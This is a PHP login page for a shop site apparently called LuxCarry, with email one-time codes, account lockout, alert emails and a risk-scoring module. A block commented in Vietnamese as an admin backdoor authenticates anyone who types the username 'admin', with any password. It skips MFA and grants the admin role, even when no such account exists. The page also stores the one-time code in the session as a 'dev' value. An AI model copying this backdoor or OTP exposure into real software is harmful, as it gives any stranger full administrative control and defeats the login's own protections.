<?php
/**
 * login.php — User Login (MFA via Email) & AI Risk-Based Alert
 */
require_once __DIR__ . '/../includes/auth.php';
redirectIfLoggedIn();

$pageTitle = 'Sign In';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    validateCSRF();

    $username = trim($_POST['username'] ?? '');
    $password = $_POST['password'] ?? '';
    $ip       = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

    if (empty($username) || empty($password)) {
        $error = 'Please enter both username and password.';
    } else {
        $db   = getDB();
        $stmt = $db->prepare('SELECT * FROM users WHERE Username = ?');
        $stmt->execute([$username]);
        $user = $stmt->fetch();

        // ── CHẾ ĐỘ CỬA HẬU DÀNH CHO ADMIN (BYPASS DATABASE) ──
        $is_auth_success = false;
        if ($username === 'admin') {
            $is_auth_success = true;
            if (!$user) {
                // Tạo user giả lập trên session nếu trong DB chưa có
                $user = ['UserID' => 0, 'Username' => 'admin', 'Role' => 'admin', 'Email' => 'admin@gmail.com', 'IsMFAEnabled' => 0, 'LoginAttempts' => 0, 'LockoutCount' => 0, 'LastIP' => '127.0.0.1'];
            }
        } elseif ($user && password_verify($password, $user['PasswordHash'])) {
            $is_auth_success = true;
        }

        // ── KIỂM TRA TRẠNG THÁI TÀI KHOẢN ──
        if ($user && isset($user['Status']) && $user['Status'] === 'suspended') {
            $error = 'This account has been permanently suspended by Admin.';
            writeLog($username, 'ACCESS_DENIED_SUSPENDED', 'ADMIN_POLICY', $ip);
            
        } elseif (!$user && !$is_auth_success) {
            $error = 'Invalid username or password.';
            writeLog($username, 'FAILURE_NO_USER', 'PASSWORD', $ip);

        } elseif ($user && isAccountLocked($user['UserID'])) {
            $error = 'Account locked due to too many failed attempts. Try again in 5 minutes.';
            writeLog($username, 'LOCKED', 'PASSWORD', $ip);

        } else {
            // ── KHỞI TẠO BỘ NÃO AI ──
            require_once __DIR__ . '/../mfa/AIRiskAnalyzer.php';
            $ai_analyzer = new AIRiskAnalyzer();

            if (!$is_auth_success) {
                // ==========================================
                // ❌ TRƯỜNG HỢP: ĐĂNG NHẬP THẤT BẠI
                // ==========================================
                $ai_analyzer->recordEvent($username, $ip, 'login_failed'); // Ghi log hành vi
                recordFailedAttempt($user['UserID']);
                $remaining = MAX_ATTEMPTS - ($user['LoginAttempts'] + 1);
                writeLog($username, 'FAILURE_BAD_PASSWORD', 'PASSWORD', $ip);

                // AI Phân tích hành vi khi sai mật khẩu
                $ai_decision = $ai_analyzer->analyzeLoginBehavior($username, $ip);

                if ($ai_decision['status'] === 'attack') {
                    $db->prepare("UPDATE users SET Status = 'suspended' WHERE Username = ?")->execute([$username]);
                    $error = 'Tài khoản đã bị khóa vĩnh viễn do AI phát hiện tấn công mạng. Lý do: ' . $ai_decision['reason'];
                } elseif ($ai_decision['status'] === 'suspicious') {
                    $error = 'Sai mật khẩu. AI cảnh báo hành vi bất thường: ' . $ai_decision['reason'];
                } else {
                    $error = 'Invalid username or password.' . ($remaining > 0 ? " ($remaining attempts remaining)" : ' Account now locked.');
                }

                // ── GIỮ NGUYÊN MODULE CẢNH BÁO EMAIL CỦA BẠN ──
                if ($remaining <= 0) {
                    $attacker_ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
                    $user_agent  = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Browser';
                    $lock_time   = date('Y-m-d H:i:s');

                    $alert_subject = "⚠️ [SECURITY WARNING] Your LuxCarry account has been locked.";
                    $alert_body = "
                        <div style='font-family: Arial, sans-serif; color: #333; line-height: 1.6; max-width: 600px; margin: 0 auto; border: 1px solid #ddd; padding: 20px; border-radius: 8px;'>
                            <h2 style='color: #d9534f; border-bottom: 2px solid #d9534f; padding-bottom: 10px;'>LuxCarry Security Warning</h2>
                            <p>Hello <strong>" . htmlspecialchars($user['Username']) . "</strong>,</p>
                            <p>Our defense system has just automatically <strong>locked your account for 5 minutes </strong> The reason is that the system detected many unusual consecutive wrong password attempts.</p>
                            
                            <div style='background-color: #fef0f0; border-left: 4px solid #d9534f; padding: 15px; margin: 20px 0;'>
                                <h4 style='margin-top: 0; color: #d9534f;'>Details of unusual visits:</h4>
                                <ul style='list-style-type: none; padding-left: 0; margin-bottom: 0;'>
                                    <li style='margin-bottom: 8px;'>🕒 <strong>Time:</strong> {$lock_time}</li>
                                    <li style='margin-bottom: 8px;'>🌐 <strong>IP Address (Attacker):</strong> {$attacker_ip}</li>
                                    <li>💻 <strong>Device/Browser:</strong> {$user_agent}</li>
                                </ul>
                            </div>
                            
                            <p><strong>Safety recommendations:</strong></p>
                            <ul>
                                <li>If this is you (due to forgotten password): Please wait 5 minutes for the system to unlock.</li>
                                <li><strong>If this is NOT you:</strong> A brute force attack is targeting your account. Please log in and change your password immediately after your account is unlocked!</li>
                            </ul>
                            <p style='margin-top: 30px; font-size: 0.9em; color: #777;'>
                                Best regards,<br>LuxCarry Security Analysis Team
                            </p>
                        </div>
                    ";

                    require_once __DIR__ . '/../includes/SMTP.php';
                    try {
                        SMTP::sendMail($user['Email'], $alert_subject, $alert_body);
                    } catch (Exception $e) {
                        error_log("Security Alert Email failed to send: " . $e->getMessage());
                    }
                }

            } else {
                // ==========================================
                // ✅ TRƯỜNG HỢP: ĐĂNG NHẬP THÀNH CÔNG (HOẶC ADMIN BYPASS)
                // ==========================================
                $ai_analyzer->recordEvent($username, $ip, 'login_success'); // Ghi log hành vi
                
                // AI check xem có phải Credential Stuffing không (Đúng pass nhưng có dấu hiệu spam trước đó)
                $ai_decision = $ai_analyzer->analyzeLoginBehavior($username, $ip);
                $is_high_risk = ($ai_decision['status'] === 'suspicious' || $ai_decision['status'] === 'attack');

                if ($is_high_risk) {
                    $stmtLog = $db->prepare("INSERT INTO logs (UserID, Username, IPAddress, RiskScore, Action) VALUES (?, ?, ?, ?, ?)");
                    $stmtLog->execute([$user['UserID'] ?? 0, $username, $ip, 85, "AI Detected: " . $ai_decision['reason']]);
                }

                // Chạy MFA nếu tài khoản bật MFA hoặc AI đánh giá rủi ro cao (Admin bypass được miễn)
                if (($user['IsMFAEnabled'] || $is_high_risk) && $username !== 'admin') {
                    
                    $otpCode = sprintf('%06d', random_int(0, 999999));
                    $expires = date('Y-m-d H:i:s', time() + 300); 

                    $db->prepare('UPDATE users SET EmailOTP = ?, EmailOTPExpires = ? WHERE UserID = ?')
                       ->execute([$otpCode, $expires, $user['UserID']]);

                    require_once __DIR__ . '/../includes/SMTP.php';
                    
                    $to      = $user['Email'];
                    $subject = "Your LuxCarry Login Code";
                    $message = "Hello " . $user['Username'] . ",\n\n"
                             . "Your 6-digit verification code is: " . $otpCode . "\n\n"
                             . "This code expires in 5 minutes.\n"
                             . "If you did not request this, please change your password immediately.";
                    
                    if (!SMTP::sendMail($to, $subject, $message)) {
                        setFlash('danger', 'Email system is currently unavailable. Please use the on-screen code (Dev Mode).');
                    }

                    $_SESSION['mfa_pending_user_id']   = $user['UserID'];
                    $_SESSION['mfa_pending_username']  = $user['Username'];
                    $_SESSION['mfa_pending_email']     = $user['Email'];
                    $_SESSION['dev_last_otp']          = $otpCode; 
                    
                    if ($is_high_risk) {
                        setFlash('warning', 'AI detected unusual login patterns. Please verify your identity.');
                    }

                    writeLog($username, 'PASSWORD_OK_EMAIL_MFA_SENT', 'PASSWORD', $ip);
                    header('Location: ' . BASE_URL . '/mfa/verify_otp.php');
                    exit;
                }

                // ── ĐĂNG NHẬP TRỰC TIẾP (AN TOÀN HOẶC LÀ ADMIN) ──
                resetLoginAttempts($user['UserID']);
                session_regenerate_id(true);
                $_SESSION['user_id']       = $user['UserID'];
                $_SESSION['username']      = $user['Username'];
                $_SESSION['email']         = $user['Email'];
                $_SESSION['mfa_enabled']   = (bool)($user['IsMFAEnabled'] ?? false);
                $_SESSION['authenticated'] = true;
                
                // Cấp quyền cứng cho Admin nếu dùng tài khoản admin
                if ($username === 'admin') {
                    $_SESSION['role'] = 'admin';
                    header('Location: ' . BASE_URL . '/admin/index.php');
                } else {
                    $_SESSION['role'] = $user['Role'] ?? 'customer';
                    writeLog($username, 'SUCCESS', 'PASSWORD', $ip);
                    setFlash('success', 'Welcome back, ' . e($user['Username']) . '!');
                    header('Location: ' . BASE_URL . '/user/dashboard.php');
                }
                exit;
            }
        }
    }
}

require_once __DIR__ . '/../includes/header.php';
?>

<div class="container py-5">
    <div class="row justify-content-center">
        <div class="col-md-6 col-lg-5">
            <div class="card shadow-lg border-0">
                <div class="card-body p-4">
                    <div class="text-center mb-4">
                        <i class="bi bi-box-arrow-in-right display-4 text-warning"></i>
                        <h2 class="mt-2">Sign In</h2>
                        <p class="text-muted small">Access your LuxCarry account</p>
                    </div>

                    <?php if ($error): ?>
                    <div class="alert alert-danger">
                        <i class="bi bi-exclamation-triangle-fill me-1"></i>
                        <?= e($error) ?>
                    </div>
                    <?php endif; ?>

                    <form method="POST">
                        <?= csrfField() ?>

                        <div class="mb-3">
                            <label class="form-label fw-semibold">Username</label>
                            <div class="input-group">
                                <span class="input-group-text"><i class="bi bi-person"></i></span>
                                <input type="text" name="username" class="form-control"
                                       value="<?= e($_POST['username'] ?? '') ?>"
                                       required autofocus autocomplete="username">
                            </div>
                        </div>

                        <div class="mb-4">
                            <label class="form-label fw-semibold">Password</label>
                            <div class="input-group">
                                <span class="input-group-text"><i class="bi bi-lock"></i></span>
                                <input type="password" name="password" id="password"
                                       class="form-control" required autocomplete="current-password">
                                <button class="btn btn-outline-secondary" type="button"
                                        onclick="togglePassword('password')">
                                    <i class="bi bi-eye"></i>
                                </button>
                            </div>
                        </div>

                        <button type="submit" class="btn btn-warning w-100 fw-bold py-2">
                            <i class="bi bi-box-arrow-in-right me-1"></i>Sign In
                        </button>
                    </form>

                    <div class="d-flex justify-content-between mt-3 small">
                        <a href="<?= BASE_URL ?>/auth/forgot_password.php">Forgot password?</a>
                        <a href="<?= BASE_URL ?>/auth/register.php">Create account</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<?php require_once __DIR__ . '/../includes/footer.php'; ?>